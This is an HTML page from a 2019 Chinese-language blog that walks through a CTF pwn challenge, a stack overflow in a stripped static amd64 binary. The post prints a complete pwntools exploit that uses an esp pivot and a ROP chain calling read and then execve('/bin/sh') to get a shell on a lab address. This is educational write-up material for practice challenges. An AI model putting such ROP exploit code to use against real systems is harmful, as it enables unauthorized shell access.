@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn入门,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就IDA">
+<meta name="keywords" content="pwn入门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过esp扩大栈空间">
+<meta property="og:url" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/index.html">
+<meta property="og:site_name" content="时钟">
+<meta property="og:description" content="声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就IDA">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/2.jpg">
+<meta property="og:updated_time" content="2019-04-13T11:30:49.902Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过esp扩大栈空间">
+<meta name="twitter:description" content="声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就IDA">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/13/通过esp扩大栈空间/">
+
+
+
+
+
+  <title>通过esp扩大栈空间 | 时钟</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">时钟</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">二进制安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/通过esp扩大栈空间/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="时钟">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="时钟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">通过esp扩大栈空间</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-13T18:06:40+08:00">
+                2019-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWM/" itemprop="url" rel="index">
+                    <span itemprop="name">PWM</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。<br>博主QQ：522796871<br>遇到一个修改esp扩大栈空间的题目跟大家分享一下：<br>程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：<br><img src="/2019/04/13/通过esp扩大栈空间/1.jpg" title="This is an image"><br>看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就<br>IDA一键f5：<br><img src="/2019/04/13/通过esp扩大栈空间/2.jpg" title="This is an image"><br>如果你进去verify函数，你就会发现它复杂的要死掉了，那我们就放弃静态分析，改用动态分析，输入大量字符测试得到有溢出，但是试着利用你就发现，根本利用不了（这也是这个题的特别之处），那我们ida动态调试得到，在verify函数中隐藏一个可以复制字符串的函数，明显为strcpy()（哎，大佬总是说明显，反正当时我看不出来），F8往下执行，发现有两个判断，输入的字符串前两位是否为py，（这个看出来应该不难吧）同时，原文中有：<br>通过观察数据我们很容易发现被修改的EIP是通过strncpy复制到输入前面的0x50个字节的最后8个（这个我之前从来没注意过，哎，是时候改抛弃无脑的GDB字符串测量了，因为你试了之后会发现，在这个题目里它没用）<br>OK,知道了上面的之后，我们可以开始构造rop了，下亮出代码（原文中的代码，我负责解释），一条条解释：<br>{<br>from pwn import <em><br>context.update(arch = ‘amd64’, os = ‘linux’, timeout = 1)<br>io = remote(‘172.17.0.3’, 10001)<br>payload = “”<br>payload += p64(0x6161616161617970)  #头两位为py，过检测<br>payload += ‘a’</em>0x40                 #padding<br>payload += p64(0x46f205)            #add esp, 0x58; ret<br>payload += ‘a’*8                    #padding<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_read设置参数<br>payload +=p64(0x8)                  #rdx = 8<br>payload += p64(0x6c7079)            #rsi = 0x6c7079<br>payload += p64(0x401823)            #pop rdi; ret 为sys_read设置参数<br>payload += p64(0x0)                 #rdi = 0<br>payload += p64(0x437ea9)            #mov rax, 0; syscall 调用sys_read<br>payload += p64(0x46f208)            #pop rax; ret<br>payload += p64(59)                  #rax = 0x3b<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_execve设置参数<br>payload += p64(0x0)                 #rdx = 0<br>payload += p64(0x0)                 #rsi = 0<br>payload += p64(0x401823)            #pop rdi; ret 为sys_execve设置参数<br>payload += p64(0x6c7079)            #rdi = 0x6c7079<br>payload += p64(0x437eae)            #syscall</p>
+<p>print io.recv()<br>io.send(payload)<br>sleep(0.1)  #等待程序执行，防止出错</p>
+<p>io.send(‘/bin/sh\x00’)<br>io.interactive()</p>
+<p>}<br>注意，对esp的利用是的栈空间变为8位，对自己造的栈空间进行溢出攻击成功的运行了read函数，从而将sys_execve函数所需要使用的参数成功执行入寄存器，最终调用了sys_execve函数，不得不说，这是个十分精彩的rop链。<br>最后：我觉得这种exp的写法还是不用的好，逻辑关系看着困难<br>注：喜欢pwn的朋友可以加我QQ  一起讨论学习呀！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn入门/" rel="tag"># pwn入门</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/06/linux-栈溢出-无保护/" rel="next" title="linux-栈溢出-无保护">
+                <i class="fa fa-chevron-left"></i> linux-栈溢出-无保护
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/24/特别讨厌的ecx-4/" rel="prev" title="特别讨厌的ecx-4">
+                特别讨厌的ecx-4 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">时钟</p>
+              <p class="site-description motion-element" itemprop="description">二进制小白进阶之路</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">时钟</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
